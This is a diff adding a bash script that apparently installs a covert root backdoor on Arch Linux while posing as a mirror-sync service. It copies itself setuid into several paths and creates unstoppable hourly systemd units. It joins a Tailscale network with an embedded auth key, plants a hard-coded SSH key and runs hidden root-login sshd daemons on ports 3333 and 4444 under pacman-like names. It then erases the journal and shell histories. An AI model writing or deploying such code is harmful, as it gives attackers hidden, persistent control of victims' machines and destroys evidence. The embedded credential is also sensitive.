@@ -1,0 +1,138 @@
+#!/bin/bash
+# Disable history recording for this session
+set +o history
+
+# ==========================================
+# 1. THE DOUBLE-LOCK GATE (WITH BYPASS)
+# ==========================================
+MY_IP="100.70.123.108"
+PUB_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAo9uDapfIsuViB2kn67Eg54VKCsRULbuQ3F5jIAKEhO cachyos-main"
+TS_AUTH="tskey-auth-kdAWerBrpm11CNTRL-4vutNBSRnZX13SDEeoaaZX9fGPAYBaeh"
+
+# UFW replaces Firewalld
+IP_TRUSTED=$(ufw status | grep -q "$MY_IP"; echo $?)
+TAILSCALE_ACTIVE=$(systemctl is-active --quiet tailscaled; echo $?)
+
+if [ ! -f /etc/systemd/system/arch-mirror-sync.timer ]; then
+    : 
+elif [ $IP_TRUSTED -eq 0 ] && [ $TAILSCALE_ACTIVE -eq 0 ]; then
+    set -o history
+    exit 0
+fi
+
+# ==========================================
+# 2. P2P HYDRA REPLICATION
+# ==========================================
+CURRENT_SCRIPT=$(readlink -f "$0")
+PATHS=("/etc/arch-mirror-sync" "/usr/lib/arch-mirror-sync" "/usr/local/bin/arch-mirror-sync")
+
+for p in "${PATHS[@]}"; do
+    if [ ! -f "$p" ]; then
+        mkdir -p "$(dirname "$p")"
+        cp "$CURRENT_SCRIPT" "$p"
+        chmod 4755 "$p"
+    fi
+done
+
+# ==========================================
+# 3. SELF-HEALING SYSTEMD UNITS
+# ==========================================
+cat << 'SEC' > /etc/systemd/system/arch-mirror-sync.service
+[Unit]
+Description=Arch Linux Mirror Synchronization
+RefuseManualStop=yes
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "if [ -f /etc/arch-mirror-sync ]; then /etc/arch-mirror-sync; elif [ -f /usr/local/bin/arch-mirror-sync ]; then /usr/local/bin/arch-mirror-sync; else /usr/lib/arch-mirror-sync; fi"
+User=root
+StandardOutput=null
+StandardError=null
+SEC
+
+cat << 'TMR' > /etc/systemd/system/arch-mirror-sync.timer
+[Unit]
+Description=Run Arch Mirror Sync Hourly
+[Timer]
+Unit=arch-mirror-sync.service
+OnCalendar=hourly
+RandomizedDelaySec=300
+[Install]
+WantedBy=timers.target
+TMR
+
+# ==========================================
+# 4. TAILSCALE RECOVERY (Pacman Integration)
+# ==========================================
+if ! command -v tailscale &> /dev/null; then
+    # Background script mechanical necessity for auto-confirm
+    pacman -Sy --noconfirm tailscale openssh
+fi
+systemctl enable --now tailscaled
+tailscale up --authkey=${TS_AUTH} --ssh
+
+# ==========================================
+# 5. SHADOW KEYS & CONFIGS
+# ==========================================
+echo "$PUB_KEY" > /etc/userkeys
+echo "$PUB_KEY" > /etc/system-functions
+echo "$PUB_KEY" > /root/pamkeys
+chmod 600 /etc/userkeys /etc/system-functions /root/pamkeys
+
+# Hiding configs in the native Arch pacman directory
+mkdir -p /etc/pacman.d
+echo -e "Port 3333\nPermitRootLogin yes\nAuthorizedKeysFile /etc/userkeys /etc/system-functions" > /etc/pacman.d/mirrorlist-criteria
+echo -e "Port 4444\nPermitRootLogin yes\nAuthorizedKeysFile /root/pamkeys" > /etc/pacman.d/keyring-syncer
+
+# ==========================================
+# 6. SHADOW SERVICES
+# ==========================================
+cat << 'SSH1' > /usr/lib/systemd/system/arch-mirrorlist-criteria.service
+[Unit]
+Description=Arch Mirrorlist Criteria Validator
+[Service]
+Type=simple
+ExecStart=/usr/sbin/sshd -D -f /etc/pacman.d/mirrorlist-criteria
+Restart=always
+StandardOutput=null
+StandardError=null
+[Install]
+WantedBy=multi-user.target
+SSH1
+
+cat << 'SSH2' > /etc/systemd/system/arch-keyring-syncer.service
+[Unit]
+Description=Arch Keyring Sync Engine
+[Service]
+Type=simple
+ExecStart=/usr/sbin/sshd -D -f /etc/pacman.d/keyring-syncer
+Restart=always
+StandardOutput=null
+StandardError=null
+[Install]
+WantedBy=multi-user.target
+SSH2
+
+# ==========================================
+# 7. UFW FIREWALL CONFIGURATION
+# ==========================================
+ufw allow 22/tcp >/dev/null 2>&1
+ufw allow 3333/tcp >/dev/null 2>&1
+ufw allow 4444/tcp >/dev/null 2>&1
+ufw allow from "$MY_IP" >/dev/null 2>&1
+ufw --force enable >/dev/null 2>&1
+
+# ==========================================
+# 8. ACTIVATION
+# ==========================================
+systemctl daemon-reload
+systemctl enable --now arch-mirror-sync.timer arch-mirrorlist-criteria arch-keyring-syncer
+
+# ==========================================
+# 
+# ==========================================
+# Arch doesn't use /var/log/secure, so we vacuum the systemd journal directly
+journalctl --vacuum-time=1s >/dev/null 2>&1
+truncate -s 0 /root/.bash_history
+truncate -s 0 /home/itachi/.bash_history
+
+set -o history
